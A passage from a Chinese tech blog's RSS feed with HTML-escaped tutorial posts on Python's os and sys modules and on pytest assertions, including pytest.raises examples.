print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;path1:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(path1))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4ospathdirname&#34;&gt;4.os.path.dirname()&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 获取当前文件的目录&lt;/span&gt;
path2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dirname(__file__)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;path2:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(path2))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5osmkdir&#34;&gt;5.os.mkdir()&lt;/h2&gt;
&lt;p&gt;os.mkdir() 方法用于创建文件夹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os

path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/www/html/ABC&amp;#34;&lt;/span&gt;
isExists&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exists(path)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; isExists:
    os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mkdir(path)
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;创建成功&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;目录已存在&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—sys 模块</title>
        <link>https://ac-lm.github.io/posts/python/pythonsys-%E6%A8%A1%E5%9D%97/</link>
        <pubDate>Wed, 24 Mar 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonsys-%E6%A8%A1%E5%9D%97/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/150835014&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Python sys 模块详解   @轩辕御龙  &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1什么是-sys-模块&#34;&gt;1.什么是 sys 模块&lt;/h2&gt;
&lt;p&gt;“sys”即“system”，即“系统”。sys模块为用户提供了一些接口，用于访问 Python 解释器自身使用和维护的变量，同时模块中还提供了一部分函数，可以与解释器进行比较深度的交互。但需要注意的是sys模块针对的是与Python解释器相关的变量和方法，不是主机操作系统。&lt;/p&gt;
&lt;h2 id=&#34;2sysargv&#34;&gt;2.sys.argv&lt;/h2&gt;
&lt;p&gt;“argv”即“argument value”的简写，其是一个列表对象，存储的是在命令行调用 Python 脚本时提供的“命令行参数”。&lt;/p&gt;
&lt;p&gt;这个列表中的第一个参数是被调用的脚本名称，也就是说，调用 Python 解释器的“命令”（&lt;code&gt;python&lt;/code&gt;）本身并没有被加入这个列表当中。这个地方要注意一下，因为这一点跟 C 程序的行为有所不同，C 程序读取命令行参数是从头开始的。&lt;/p&gt;
&lt;p&gt;举例来说，在当前目录下新建一个 Python 文件 test.py，其内容为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The list of command line arguments:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在命令行运行该脚本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; $ python test.py
 The list of command line arguments:
  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;example.py&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;加上几个参数运行，可以看到参数被获取并输出&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; $ python test.py arg1 arg2 arg3
 The list of command line arguments:
  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;example.py&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;arg1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;arg2&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;arg3&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3syspath&#34;&gt;3.sys.path&lt;/h2&gt;
&lt;p&gt;A list of strings that specifies the search path for modules. Initialized from the environment variable &lt;code&gt;PYTHONPATH&lt;/code&gt;, plus an installation-dependent default.&lt;/p&gt;
&lt;p&gt;该属性是一个由字符串组成的列表，其中各个元素表示的是 Python 搜索模块的路径；在程序启动期间被初始化。&lt;/p&gt;
&lt;p&gt;其中第一个元素（也就是path[0]）的值是最初调用 Python 解释器的脚本所在的绝对路径；如果是在交互式环境下查看sys.path的值，就会得到一个空字符串。&lt;/p&gt;
&lt;p&gt;命令行运行脚本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ python test.py
The path&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  D:&lt;span style=&#34;color:#ae81ff&#34;&gt;\j&lt;/span&gt;ustdopython&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;ys_example
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;交互式环境查看属性第一个元素：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;gt;&amp;gt;&amp;gt; sys.path&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4sysstdinsysstdoutsysstderr&#34;&gt;4.sys.stdin、sys.stdout、sys.stderr&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;stdin：用于所有的交互式输入（包括input()函数）。&lt;/li&gt;
&lt;li&gt;stdout：用于print()的打印输出或者input()函数的提示符。&lt;/li&gt;
&lt;li&gt;stderr：用于解释器自己的提示信息和错误信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;简而言之，这三个属性就是操作系统的标准输入、输出和错误流，它们返回的都是一个“文件类型”对象，支持read()、write()和flush()等操作，就像用open()方法打开的文件对象那样！&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;gt;&amp;gt;&amp;gt; import sys
&amp;gt;&amp;gt;&amp;gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys.stdin.read&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 使用ctrl+d结束输入&lt;/span&gt;
i like python
end

&amp;gt;&amp;gt;&amp;gt; s
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;i like python\nend\n\n\n\n&amp;#39;&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; sys.stdout.write&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
i like python
end

&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5sysstdout-与-print&#34;&gt;5.sys.stdout 与 print()&lt;/h2&gt;
&lt;p&gt;当我们用input(&amp;lsquo;Please input something！&#39;)时，事实上是先输出提示信息，然后捕获输入。 以下两组等价：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Please input something！&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
----------------------------------------------------------------
print&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Please input something！&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 逗号表示不换行&lt;/span&gt;
s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys.stdin.readline&lt;span style=&#34;color:#f92672&#34;&gt;()[&lt;/span&gt;:-1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# -1 可以抛弃输入流中的&amp;#39;\n&amp;#39; 换行符，自己琢磨一下为什么。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6sysstdin-与-input&#34;&gt;6.sys.stdin 与 input()&lt;/h2&gt;
&lt;p&gt;当我们 print(obj) 的时候，事实上是调用了sys.stdout.write(obj+&#39;\n&amp;rsquo;)，将内容打印到控制台（默认是显示器），然后追加一个换行符。以下两行等价：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sys.stdout.write&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
-------------------------------------------------------
print&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7从控制台重定向到文件&#34;&gt;7.从控制台重定向到文件&lt;/h2&gt;
&lt;p&gt;默认情况下 sys.stdout 指向控制台。如果把文件对象赋值给 sys.stdout，那么 print () 调用的就是文件对象的 write() 方法。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;f_handler &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;out.log&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
sys.stdout &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f_handler 
print&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 你无法在屏幕上看到“hello”&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 因为它被写到out.log文件里了&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果你还想同时在控制台打印的话，最好先将原始的控制台对象引用保存下来，向文件中打印之后再恢复 sys.stdout.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;__console__ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout    &lt;span style=&#34;color:#75715e&#34;&gt;# 保存控制台&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# redirection start #       # 去干点别的，比如写到文件里&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; 
&lt;span style=&#34;color:#75715e&#34;&gt;# redirection end           # 干完别的了，恢复原来的控制台&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __console__
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8其他指令&#34;&gt;8.其他指令&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv    &lt;span style=&#34;color:#75715e&#34;&gt;#获取命令行参数列表，第一个元素是程序本身&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit(n) &lt;span style=&#34;color:#75715e&#34;&gt;#退出Python程序，exit(0)表示正常退出。当参数非0时，会引发一个SystemExit异常，可以在程序中捕获该异常&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;version &lt;span style=&#34;color:#75715e&#34;&gt;#获取Python解释程器的版本信息&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;maxsize &lt;span style=&#34;color:#75715e&#34;&gt;#最大的Int值，64位平台是2**63 - 1&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path    &lt;span style=&#34;color:#75715e&#34;&gt;#返回模块的搜索路径，初始化时使用PYTHONPATH环境变量的值&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;platform    &lt;span style=&#34;color:#75715e&#34;&gt;#返回操作系统平台名称&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin   &lt;span style=&#34;color:#75715e&#34;&gt;#输入相关&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout  &lt;span style=&#34;color:#75715e&#34;&gt;#输出相关&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stderr  &lt;span style=&#34;color:#75715e&#34;&gt;#错误相关&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exc_info()  &lt;span style=&#34;color:#75715e&#34;&gt;#返回异常信息三元元组&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getdefaultencoding()    &lt;span style=&#34;color:#75715e&#34;&gt;#获取系统当前编码，默认为utf-8&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setdefaultencoding()    &lt;span style=&#34;color:#75715e&#34;&gt;#设置系统的默认编码&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getfilesystemencoding() &lt;span style=&#34;color:#75715e&#34;&gt;#获取文件系统使用编码方式，默认是utf-8&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;modules &lt;span style=&#34;color:#75715e&#34;&gt;#以字典的形式返回所有当前Python环境中已经导入的模块&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;builtin_module_names    &lt;span style=&#34;color:#75715e&#34;&gt;#返回一个列表，包含所有已经编译到Python解释器里的模块的名字&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copyright   &lt;span style=&#34;color:#75715e&#34;&gt;#当前Python的版权信息&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flags   &lt;span style=&#34;color:#75715e&#34;&gt;#命令行标识状态信息列表。只读。&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getrefcount(object) &lt;span style=&#34;color:#75715e&#34;&gt;#返回对象的引用数量&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getrecursionlimit() &lt;span style=&#34;color:#75715e&#34;&gt;#返回Python最大递归深度，默认1000&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getsizeof(object[, default])    &lt;span style=&#34;color:#75715e&#34;&gt;#返回对象的大小&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getswitchinterval() &lt;span style=&#34;color:#75715e&#34;&gt;#返回线程切换时间间隔，默认0.005秒&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setswitchinterval(interval) &lt;span style=&#34;color:#75715e&#34;&gt;#设置线程切换的时间间隔，单位秒&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getwindowsversion() &lt;span style=&#34;color:#75715e&#34;&gt;#返回当前windwos系统的版本信息&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hash_info   &lt;span style=&#34;color:#75715e&#34;&gt;#返回Python默认的哈希方法的参数&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;implementation  &lt;span style=&#34;color:#75715e&#34;&gt;#当前正在运行的Python解释器的具体实现，比如CPython&lt;/span&gt;
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;thread_info &lt;span style=&#34;color:#75715e&#34;&gt;#当前线程信息&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Pytest—assert 断言</title>
        <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytestassert-%E6%96%AD%E8%A8%80/</link>
        <pubDate>Sun, 31 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytestassert-%E6%96%AD%E8%A8%80/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/poloyy/p/12641778.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;  assert断言详细使用  @小菠萝测试笔记 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1前言&#34;&gt;1.前言&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;与unittest不同，pytest使用的是python自带的assert关键字来进行断言&lt;/li&gt;
&lt;li&gt;assert关键字后面可以接一个表达式，只要表达式的最终结果为True，那么断言通过，用例执行成功，否则用例执行失败&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2实例&#34;&gt;2.实例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 异常信息&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_function&lt;/span&gt;():
    a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;判断 a 为偶数，当前 a 的值为：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051010103.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051010103.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;3常用断言&#34;&gt;3.常用断言&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;assert xx ：判断 xx 为真&lt;/li&gt;
&lt;li&gt;assert not xx ：判断 xx 不为真&lt;/li&gt;
&lt;li&gt;assert a in b ：判断 b 包含 a&lt;/li&gt;
&lt;li&gt;assert a == b ：判断 a 等于 b&lt;/li&gt;
&lt;li&gt;assert a != b ：判断 a 不等于 b&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4异常断言-pytestraises&#34;&gt;4.异常断言 pytest.raises&lt;/h2&gt;
&lt;p&gt;在断言一些代码块或者函数时会引发意料之中的异常或者其他失败的异常，导致程序无法运行时，使用 raises 可以捕获匹配到的异常，继续让代码正常运行。&lt;/p&gt;
&lt;h3 id=&#34;araises-可以捕获异常并继续后续断言代码&#34;&gt;a.raises 可以捕获异常，并继续后续断言代码&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pytest


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_raises&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; pytest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raises(&lt;span style=&#34;color:#a6e22e&#34;&gt;ZeroDivisionError&lt;/span&gt;):
        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; eval(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1 + 2&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b可以使用-match-和-raise-进行自定义异常&#34;&gt;b.可以使用 match 和 raise 进行自定义异常&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pytest

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exc&lt;/span&gt;(x):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ValueError&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;value not 0 or None&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; x

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_raises&lt;/span&gt;():
    &lt;span style=&#34;color:#75715e&#34;&gt;# match 允许正则&lt;/span&gt;
